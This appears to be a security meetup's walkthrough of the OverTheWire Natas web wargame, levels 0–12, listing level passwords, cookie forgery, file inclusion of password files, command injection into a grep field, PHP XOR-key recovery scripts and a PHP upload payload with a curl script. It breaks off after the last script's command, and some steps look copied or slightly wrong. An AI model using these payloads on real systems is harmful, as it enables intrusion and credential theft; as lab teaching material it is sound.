

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta content="default-src 'none'; script-src 'self' https://cdnjs.cloudflare.com 'unsafe-inline'; connect-src 'self'; img-src 'self'; style-src 'self'; font-src 'self'; form-action 'self'; frame-ancestors 'none'; base-uri 'self'" http-equiv="Content-Security-Policy" />
<meta content="nosniff" http-equiv="X-Content-Type-Options" />
<meta content="deny" http-equiv="X-Frame-Options" />
<meta content="1; mode=block" http-equiv="X-XSS-Protection" />
<meta content="strict-origin" http-equiv="Referrer-Policy" />
<meta content="max-age=31536000; includeSubDomains" http-equiv="Strict-Transport-Security" />
<meta content="'*'" http-equiv="Access-Control-Allow-Origin" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>3.27. Natas &mdash; South Bay WASP 1.0.3 documentation</title>
  

  
  
  
  

  

  
  
    

  

  
  
    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  

  

  
        <link rel="index" title="Index"
              href="../genindex.html"/>
        <link rel="search" title="Search" href="../search.html"/>
    <link rel="top" title="South Bay WASP 1.0.3 documentation" href="../index.html"/>
        <link rel="up" title="3. Pentest Challenges" href="../pentest_challenges.html"/>
        <link rel="next" title="3.28. try2hack.nl" href="try2hack.nl.html"/>
        <link rel="prev" title="3.26. Exploit Exercises Nebula" href="nebula.html"/> 

  
  <script src="../_static/js/modernizr.min.js"></script>

</head>

<body class="wy-body-for-nav" role="document">

   
  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search">
          

          
            <a href="../index.html" class="icon icon-home"> South Bay WASP
          

          
          </a>

          
            
            
              <div class="version">
                1.0
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
              
            
            
              <p class="caption"><span class="caption-text">Table of Contents</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../pentest_intro.html">1. South Bay WASP Meetup</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_kali.html">2. Kali Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="../pentest_challenges.html">3. Pentest Challenges</a><ul class="current">
<li class="toctree-l2"><a class="reference internal" href="VWADP.html">3.1. Finding and running challenges</a></li>
<li class="toctree-l2"><a class="reference internal" href="owlnest.html">3.2. OwlNest</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice6.html">3.3. De-ICE Level 6</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice5.html">3.4. De-ICE Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice4.html">3.5. De-ICE Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice3.html">3.6. De-ICE Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice2.html">3.7. De-ICE Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="de-ice1.html">3.8. De-ICE Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="underdist3.html">3.9. Underdist: 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix5.html">3.10. Kioptrix Level 5</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix4.html">3.11. Kioptrix Level 4</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix3.html">3.12. Kioptrix Level 3</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix2.html">3.13. Kioptrix Level 2</a></li>
<li class="toctree-l2"><a class="reference internal" href="kioptrix1.html">3.14. Kioptrix Level 1</a></li>
<li class="toctree-l2"><a class="reference internal" href="security_shepherd.html">3.15. Security Shepherd Web App Levels</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix2.html">3.16. Holynix2</a></li>
<li class="toctree-l2"><a class="reference internal" href="holynix1.html">3.17. Holynix1</a></li>
<li class="toctree-l2"><a class="reference internal" href="freshly.html">3.18. Freshly</a></li>
<li class="toctree-l2"><a class="reference internal" href="zorz.html">3.19. ZorZ</a></li>
<li class="toctree-l2"><a class="reference internal" href="vulnix.html">3.20. Vulnix</a></li>
<li class="toctree-l2"><a class="reference internal" href="googles_xss_game.html">3.21. Google’s XSS Game</a></li>
<li class="toctree-l2"><a class="reference internal" href="owning_database_with_sqlmap.html">3.22. Owning the Database with SQLMap</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell_II.html">3.23. PentesterLab From SQL injection to Shell II</a></li>
<li class="toctree-l2"><a class="reference internal" href="from_sql_injection_to_shell.html">3.24. PentesterLab From SQL injection to Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="skytower1.html">3.25. SkyTower1</a></li>
<li class="toctree-l2"><a class="reference internal" href="nebula.html">3.26. Exploit Exercises Nebula</a></li>
<li class="toctree-l2 current"><a class="current reference internal" href="#">3.27. Natas</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id2">3.27.1. Natas Level 0 -&gt; 1</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id3">3.27.2. Natas Level 1 -&gt; 2</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id4">3.27.3. Natas Level 2 -&gt; 3</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id5">3.27.4. Natas Level 3 -&gt; 4</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id6">3.27.5. Natas Level 4 -&gt; 5</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id7">3.27.6. Natas Level 5 -&gt; 6</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id8">3.27.7. Natas Level 6 -&gt; 7</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id9">3.27.8. Natas Level 7 -&gt; 8</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id10">3.27.9. Natas Level 8 -&gt; 9</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id11">3.27.10. Natas Level 9 -&gt; 10</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id12">3.27.11. Natas Level 10 -&gt; 11</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id13">3.27.12. Natas Level 11 -&gt; 12</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id14">3.27.13. Natas Level 13 -&gt; 14</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id15">3.27.14. Natas Level 14 -&gt; 15</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id16">3.27.15. Natas Level 15 -&gt; 16</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id17">3.27.16. Natas Level 16 -&gt; 17</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id18">3.27.17. Natas Level 17 -&gt; 18</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id19">3.27.18. Natas Level 18 -&gt; 19</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id20">3.27.19. Natas Level 19 -&gt; 20</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id21">3.27.20. Natas Level 20 -&gt; 21</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id22">3.27.21. Natas Level 21 -&gt; 22</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id23">3.27.22. Natas Level 22 -&gt; 23</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id24">3.27.23. Natas Level 23 -&gt; 24</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id25">3.27.24. Natas Level 24 -&gt; 25</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id26">3.27.25. Natas Level 25 -&gt; 26</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id27">3.27.26. Natas Level 26 -&gt; 27</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id28">3.27.27. Natas Level 27</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="try2hack.nl.html">3.28. try2hack.nl</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_encryption.html">4. Encryption</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_html.html">5. HTML</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_network_tools.html">6. Pentest Network Tools</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_recon.html">7. Pentest Reconnaisance</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_study.html">8. Pentest Study</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_buffer_overflow.html">9. Pentest Buffer Overflow</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_scripting.html">10. Pentest scripting</a></li>
<li class="toctree-l1"><a class="reference internal" href="../pentest_presentations.html">11. Pentest Presentations</a></li>
</ul>

            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">South Bay WASP</a>
        
      </nav>


      
      <div class="wy-nav-content">
        <div class="rst-content">
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="../index.html">Docs</a> &raquo;</li>
        
          <li><a href="../pentest_challenges.html">3. Pentest Challenges</a> &raquo;</li>
        
      <li>3.27. Natas</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            <a href="../_sources/challenges/natas.rst.txt" rel="nofollow"> View page source</a>
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="natas">
<span id="id1"></span><h1>3.27. Natas<a class="headerlink" href="#natas" title="Permalink to this headline">¶</a></h1>
<p>This is to document the meetup’s efforts responding to the challenge <a class="reference external" href="http://overthewire.org/wargames/natas/">OverTheWire Natas</a>. Natas teaches the basics of serverside web security. It starts with username, password, url natas0, natas0, <a class="reference external" href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a> and the next level’s password stored in /etc/natas_webpass/netas1. The numbers bump by one for each level until the final level of 27. We’ll use <a class="reference external" href="http://nsimattstiles.wordpress.com/2014/02/05/overthewire-natas-level-0-16-writeup-updated/">OVERTHEWIRE – NATAS – LEVEL 0-20 – WRITEUP — UPDATED</a> as a guide to the answers for levels 0 - 20.</p>
<div class="section" id="id2">
<h2>3.27.1. <a class="reference external" href="http://natas0.natas.labs.overthewire.org/">Natas Level 0 -&gt; 1</a><a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h2>
<p>Level 0 Password = “natas0”</p>
<p>Simply view the page source.</p>
</div>
<div class="section" id="id3">
<h2>3.27.2. <a class="reference external" href="http://natas1.natas.labs.overthewire.org/">Natas Level 1 -&gt; 2</a><a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h2>
<p>Level 1 Password = “gtVrDuiDfck831PqWsLEZy5gyDz1clto”</p>
<p>Simply view the page source.</p>
</div>
<div class="section" id="id4">
<h2>3.27.3. <a class="reference external" href="http://natas2.natas.labs.overthewire.org/">Natas Level 2 -&gt; 3</a><a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
<p>Level 2 Password = “ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi”</p>
<p>The page source reveals a reference to /files/pixel.png, so opening up <a class="reference external" href="http://natas2.natas.labs.overthewire.org/files">http://natas2.natas.labs.overthewire.org/files</a> reveals a users.txt file containing the password.</p>
</div>
<div class="section" id="id5">
<h2>3.27.4. <a class="reference external" href="http://natas3.natas.labs.overthewire.org/">Natas Level 3 -&gt; 4</a><a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h2>
<p>Level 3 Password = “sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14”</p>
<p>The hint is about Google not finding it, so open <a class="reference external" href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> to find <em>Disallow: /s3cr3t/</em> and in the directory /s3cr3t/ you’ll find another users.txt file containing the password.</p>
</div>
<div class="section" id="id6">
<h2>3.27.5. <a class="reference external" href="http://natas4.natas.labs.overthewire.org/">Natas Level 4 -&gt; 5</a><a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h2>
<p>Level 4 Password = “Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ”</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> wget http://natas4.natas.labs.overthewire.org/  <span class="se">\</span>
    --header<span class="o">=</span><span class="s1">&#39;Referer: http://natas5.natas.labs.overthewire.org/&#39;</span>  <span class="se">\</span>
    --user natas4  --password <span class="s1">&#39;Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ&#39;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">2014-07-17 09:30:43 (84.2 MB/s) - ‘index.html’ saved [962/962]</span>

<span class="gp">me@myhost:~/Natas$</span> grep natas5 index.html
<span class="go">Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</span>
</pre></div>
</div>
</div>
<div class="section" id="id7">
<h2>3.27.6. <a class="reference external" href="http://natas5.natas.labs.overthewire.org/">Natas Level 5 -&gt; 6</a><a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h2>
<p>Level 5 Password = “iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq”</p>
<p>Viewing your cookies in your browser you notice a cookie “loggedin” with value “0”. Use your browser to change the value. For example in Google Chrome, in the developers console enter this javascript: <code class="docutils literal"><span class="pre">document.cookie=&quot;loggedin=1&quot;</span></code> followed by refreshing the screen. Alternatively you can use <code class="docutils literal"><span class="pre">wget</span></code>.</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> wget http://natas5.natas.labs.overthewire.org/  <span class="se">\</span>
    --user natas5  --password <span class="s1">&#39;iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq&#39;</span> <span class="se">\</span>
    --no-cookies --header <span class="s1">&#39;Cookie: loggedin=1;&#39;</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">2014-07-17 09:59:31 (76.6 MB/s) - ‘index.html’ saved [890/890]</span>

<span class="gp">me@myhost:~/Natas$</span> grep natas6 index.html
<span class="go">Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1&lt;/div&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="id8">
<h2>3.27.7. <a class="reference external" href="http://natas6.natas.labs.overthewire.org/">Natas Level 6 -&gt; 7</a><a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h2>
<p>Level 6 Password = “aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1”</p>
<p>Follow the “View sourcecode” link. Open in “includes/secret.inc” reference found on that page to reveal <code class="docutils literal"><span class="pre">$secret</span> <span class="pre">=</span> <span class="pre">&quot;FOEIUWGHFEEUHOFUOIU&quot;;</span></code>. Enter that on the original Natas Level 6 page to get the password.</p>
</div>
<div class="section" id="id9">
<h2>3.27.8. <a class="reference external" href="http://natas7.natas.labs.overthewire.org/">Natas Level 7 -&gt; 8</a><a class="headerlink" href="#id9" title="Permalink to this headline">¶</a></h2>
<p>Level 7 Password = “7z3hEENjQtflzgnT29q7wAvMNfZdh0i9”</p>
<p>Viewing the page source reveals the hint “password for webuser natas8 is in /etc/natas_webpass/natas8”. Looking at the url for the about page reveals the http get “index.php?page=about”. Trying a get of <a class="reference external" href="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8">index.php?page=/etc/natas_webpass/natas8</a> reveals the password.</p>
</div>
<div class="section" id="id10">
<h2>3.27.9. <a class="reference external" href="http://natas8.natas.labs.overthewire.org/">Natas Level 8 -&gt; 9</a><a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h2>
<p>Level 8 Password = “DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe”</p>
<p>The web page has a “view sourcecode” link which shows:</p>
<div class="line-block">
<div class="line">“3d3d516343746d4d6d6c315669563362” ==</div>
<div class="line">bin2hex(strrev(base64_encode($secret)))</div>
</div>
<p>Using python we compute the inverse to get the secret:</p>
<div class="highlight-none"><div class="highlight"><pre><span></span>me@myhost:~/Natas$ python -c &#39;from binascii import a2b_base64, unhexlify;
    print(a2b_base64(unhexlify(&quot;3d3d516343746d4d6d6c315669563362&quot;)[::-1]))&#39;
oubWYf2kBq
</pre></div>
</div>
<p>Then entering “oubWYf2kBq” input secret gets us the natas9 password “W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl”.</p>
</div>
<div class="section" id="id11">
<h2>3.27.10. <a class="reference external" href="http://natas9.natas.labs.overthewire.org/">Natas Level 9 -&gt; 10</a><a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h2>
<p>Level 9 Password = “W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl”</p>
<p>The web page has a “view sourcecode” link which shows the form input value is used in a shell command: <code class="docutils literal"><span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">$key</span> <span class="pre">dictionary.txt</span></code>. So by setting the form value to <code class="docutils literal"><span class="pre">1</span> <span class="pre">/etc/natas_webpass/natas10</span></code> will show the password as “nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu”.</p>
</div>
<div class="section" id="id12">
<h2>3.27.11. <a class="reference external" href="http://natas10.natas.labs.overthewire.org/">Natas Level 10 -&gt; 11</a><a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h2>
<p>Level 10 Password = “nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu”</p>
<p>The web page has a “view sourcecode” link which shows the form input value is used in a shell command: <code class="docutils literal"><span class="pre">grep</span> <span class="pre">-i</span> <span class="pre">$key</span> <span class="pre">dictionary.txt</span></code>. So by setting the form value to <code class="docutils literal"><span class="pre">1</span> <span class="pre">/etc/natas_webpass/natas10</span></code> will show the password as “U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK”.</p>
</div>
<div class="section" id="id13">
<h2>3.27.12. <a class="reference external" href="http://natas11.natas.labs.overthewire.org/">Natas Level 11 -&gt; 12</a><a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h2>
<p>Level 11 Password = “U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK”</p>
<p>The web page has a “view sourcecode” link which shows a php script function <code class="docutils literal"><span class="pre">xor_encrypt</span></code> with an unspecified encryption key “protecting” the cookie data which you have in your possession locally. After a little code reading, this exploit will take 2 steps: determine the key, then encrypt the data <em>array( “showpassword”=&gt;”yes”, “bgcolor”=&gt;”#ffffff”)</em> to get a key which will show the next password.</p>
<p>So how to get the key? First let’s get the current cookie. It is just an “encrypted” form of <em>array(“showpassword”=&gt;”no”, “bgcolor”=&gt;”#ffffff”)</em>. We can get that easily from the browser (in Chrome via the developer tools to see it is “ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw”) or we can run <code class="docutils literal"><span class="pre">ngrep</span></code> when we refresh the browser window:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> sudo ngrep -lpd eth0 <span class="s2">&quot;^GET |^POST&quot;</span> <span class="se">\</span>
    host natas10.natas.labs.overthewire.org
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="gp">#</span><span class="c1">##########</span>
<span class="go">T 192.168.1.23:58290 -&gt; 178.79.134.250:80 [AP]</span>
<span class="go">  GET /?bgcolor=%23ffffff HTTP/1.1..Host: natas11.natas.labs.overthewire.org.</span>
<span class="gp">#</span><span class="c1">##################### SNIP ######################</span>
<span class="go">Cookie: data=ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D....</span>
<span class="gp">#</span><span class="c1">#####</span>
</pre></div>
</div>
<p>The reason using <code class="docutils literal"><span class="pre">xor</span></code> is so bad is that we can take this “encrypted” cookie and use it as the encryption key against <code class="docutils literal"><span class="pre">json_encode(array(</span> <span class="pre">&quot;showpassword&quot;=&gt;&quot;no&quot;,</span> <span class="pre">&quot;bgcolor&quot;=&gt;&quot;#ffffff&quot;))</span></code> to get the original encryption key. We use the following php script</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// NOTE - replaced encryption key with cookie</span>
    <span class="nv">$b64_cookie</span> <span class="o">=</span> <span class="s1">&#39;ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw&#39;</span><span class="p">;</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$b64_cookie</span><span class="p">);</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    <span class="c1">// Iterate through each character</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$no_show</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;no&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span> <span class="nx">xor_encrypt</span><span class="p">((</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$no_show</span><span class="p">))));</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>And when we run it we get the “hidden” xor key “qw8J”:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> php crack_xor.php
<span class="go">qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</span>
</pre></div>
</div>
<p>So now that we have the key we can create an “encrypted” key for <em>array( “showpassword”=&gt;”yes”, “bgcolor”=&gt;”#ffffff”)</em> via this php script:</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="k">function</span> <span class="nf">xor_encrypt</span><span class="p">(</span><span class="nv">$in</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// NOTE - replaced encryption key with cookie</span>
    <span class="nv">$key</span> <span class="o">=</span> <span class="s1">&#39;qw8J&#39;</span><span class="p">;</span>
    <span class="nv">$text</span> <span class="o">=</span> <span class="nv">$in</span><span class="p">;</span>
    <span class="nv">$outText</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

    <span class="c1">// Iterate through each character</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$text</span><span class="p">);</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="nv">$outText</span> <span class="o">.=</span> <span class="nv">$text</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">^</span> <span class="nv">$key</span><span class="p">[</span><span class="nv">$i</span> <span class="o">%</span> <span class="nb">strlen</span><span class="p">(</span><span class="nv">$key</span><span class="p">)];</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="nv">$outText</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$yes_show</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&quot;showpassword&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;yes&quot;</span><span class="p">,</span> <span class="s2">&quot;bgcolor&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;#ffffff&quot;</span><span class="p">);</span>
<span class="nb">fwrite</span><span class="p">(</span><span class="nx">STDOUT</span><span class="p">,</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nx">xor_encrypt</span><span class="p">((</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$no_show</span><span class="p">)))));</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> php encrypt.php
<span class="go">ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</span>
</pre></div>
</div>
<p>So all that’s left to do is to replace the “data” cookie with this value and re-fetch the page. You can either use your browser or use <code class="docutils literal"><span class="pre">wget</span></code> as follows:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> wget -q -O - http://natas11.natas.labs.overthewire.org//?bgcolor<span class="o">=</span>%23ffffff  <span class="se">\</span>
&gt;   --no-cookies <span class="se">\</span>
&gt;   --header<span class="o">=</span><span class="s1">&#39;Cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK&#39;</span> <span class="se">\</span>
&gt;   --user<span class="o">=</span><span class="s1">&#39;natas11&#39;</span> <span class="se">\</span>
&gt;   --password<span class="o">=</span><span class="s1">&#39;U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK&#39;</span> <span class="p">|</span> <span class="se">\</span>
&gt; grep natas12
<span class="go">The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3&lt;br&gt;</span>
</pre></div>
</div>
<p><a class="reference external" href="http://natas12.natas.labs.overthewire.org/">Natas Level 12 -&gt; 13</a></p>
<p>Level 12 Password = “EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3”</p>
<p>The web page has a “view sourcecode” link which shows a php script allowing a file upload. Careful analysis of the script shows that by overriding the hidden <em>filename</em> field with any filename with extension <em>.php</em> you can upload any php script to the <em>/upload</em> directory, like <em>natas13.php</em> printing out the password file:</p>
<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?</span>

<span class="nv">$myFile</span> <span class="o">=</span> <span class="s2">&quot;/etc/natas_webpass/natas13&quot;</span><span class="p">;</span>
<span class="nv">$fh</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$myFile</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
<span class="nv">$theData</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fh</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>
<span class="nb">fclose</span><span class="p">(</span><span class="nv">$fh</span><span class="p">);</span>
<span class="k">echo</span> <span class="nv">$theData</span><span class="p">;</span>

<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
</div>
<p>Here’s the bash script <em>natas13.sh</em> using <code class="docutils literal"><span class="pre">curl</span></code> to display natas13’s password. It assumes the above php code is the local file <em>natas13.php</em> seen above:</p>
<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env bash</span>

<span class="nv">upload</span><span class="o">=</span><span class="k">$(</span> <span class="se">\</span>
  curl --silent <span class="se">\</span>
       --form <span class="nv">action</span><span class="o">=</span>index.php <span class="se">\</span>
       --form <span class="nv">MAX_FILE_SIZE</span><span class="o">=</span><span class="m">1000</span> <span class="se">\</span>
       --form <span class="nv">filename</span><span class="o">=</span>natas13.php <span class="se">\</span>
       --form <span class="nv">submit</span><span class="o">=</span><span class="s2">&quot;Upload File&quot;</span> <span class="se">\</span>
       --form <span class="nv">uploadedfile</span><span class="o">=</span>@natas13.php <span class="se">\</span>
       --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 <span class="se">\</span>
       http://natas12.natas.labs.overthewire.org/ <span class="se">\</span>
  <span class="p">|</span> grep <span class="s1">&#39;a href=&quot;upload/&#39;</span> <span class="se">\</span>
<span class="k">)</span>
<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">upload</span><span class="p">#*upload/</span><span class="si">}</span>
<span class="nv">file</span><span class="o">=</span><span class="si">${</span><span class="nv">file</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
curl --silent <span class="se">\</span>
     --user natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 <span class="se">\</span>
     http://natas12.natas.labs.overthewire.org/upload/<span class="nv">$file</span>
</pre></div>
</div>
<p>And running the code gives us the password:</p>
<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">me@myhost:~/Natas$</span> ./natas13.sh
